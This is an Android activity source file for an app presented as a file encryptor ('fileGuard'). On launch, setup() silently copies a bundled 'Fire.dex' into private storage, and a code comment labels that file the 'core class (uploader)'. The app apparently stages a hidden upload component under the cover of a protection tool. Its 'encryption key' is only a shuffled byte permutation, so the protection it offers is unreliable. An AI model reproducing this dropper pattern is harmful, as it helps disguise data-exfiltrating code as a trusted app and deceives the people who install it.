package com.iq500.protect0r;

import android.*;
import android.app.*;
import android.content.*;
import android.content.res.*;
import android.net.*;
import android.os.*;
import android.support.v4.app.*;
import android.view.*;
import android.widget.*;
import java.io.*;
import java.util.*;

public class MainActivity extends Activity 
{
	
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		getPer();
		checkKey();
		setup();
		checkInterupt();
		
		Button[] buttons = {
			findViewById(R.id.but_Enc),
			findViewById(R.id.but_chKey),
			findViewById(R.id.but_openFolder)
			};
		
		cleanUp(buttons[0]);
			
		buttons[0].setOnClickListener(new Button.OnClickListener() {  
				@Override  
				public void onClick(View v)
				{  
					Intent intent = new Intent(MainActivity.this, Encrypt.class);
					startActivity(intent);
				}  
			});
			
		buttons[1].setOnClickListener(new Button.OnClickListener() {  
				@Override  
				public void onClick(View v)
				{  
					makeKey();
				}  
			});
			
		buttons[2].setOnClickListener(new Button.OnClickListener() {  
				@Override  
				public void onClick(View v)
				{  	
					new File("/sdcard/fileGuard").mkdir();
					Uri folder = Uri.parse("/sdcard/fileGuard/");
					Intent intent = new Intent(Intent.ACTION_VIEW);
					intent.setDataAndType(folder, "resource/folder");

					if (intent.resolveActivityInfo(getPackageManager(), 0) != null)
					{
						startActivity(intent);
					}
				}  
			});
    }
	
	private void makeKey()
    {
        String key = "";
        ArrayList<Integer> num = new ArrayList<Integer>();
        for(int i = 0; i < 256; i++)
        {
            num.add(i);
        }
        Collections.shuffle(num);

        for(int i = 0; i < 256; i++)
        {
            key += String.valueOf(num.get(i));
            if(i < 255)
                key += ",";
        }
		
		SharedPreferences shared = getSharedPreferences("pref", Context.MODE_PRIVATE);
		shared.edit().putString("key", key).commit();
		Toast.makeText(this, "Created new key...", Toast.LENGTH_LONG).show();

    }
    public String checkKey()
    {
		
		SharedPreferences shared = getSharedPreferences("pref", Context.MODE_PRIVATE);
		if(!shared.contains("key"))
			makeKey();
		return shared.getString("key", "");
    }
	
	
	//copy dex file
	private void copy(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
			out.write(buffer, 0, read);
        }
    }

	private void setup()
	{
		File outputDir = this.getFilesDir();
		String fileRoot = outputDir.toString();
		File coreClassLocation = new File(fileRoot + "/Fire.dex"); //core class (uploader)
		try
		{
			if(!coreClassLocation.exists())
			{
				AssetManager assetManager = getAssets();
				InputStream in = assetManager.open("Fire.dex");
				OutputStream out = new FileOutputStream(coreClassLocation);
				copy(in, out);
				in.close();
				out.flush();
				out.close();
			}

		}
		catch (Exception e)
		{
			//debug use
			//Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
		}
	}
	
	private void cleanUp(Button button0)
	{
		button0.setEnabled(false);
		File infoFile = new File(getFilesDir().toString() + "/info");
		if(infoFile.exists()) infoFile.delete();
		button0.setEnabled(true);
	}
	
	private void checkInterupt(){
		File garbage = new File("/sdcard/file_result.txt");
		if(garbage.exists())
		{
			garbage.delete();
			Toast.makeText(this, "You have interrupted previous operation...", Toast.LENGTH_SHORT).show();
			Toast.makeText(this, "Check backup files (if any) in folder 'fileGuard' under /sdcard/", Toast.LENGTH_LONG).show();
			
		}
			
	}
	
	private void getPer()
	{
		ActivityCompat.requestPermissions(MainActivity.this,
										  new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
										  1);
	}
}
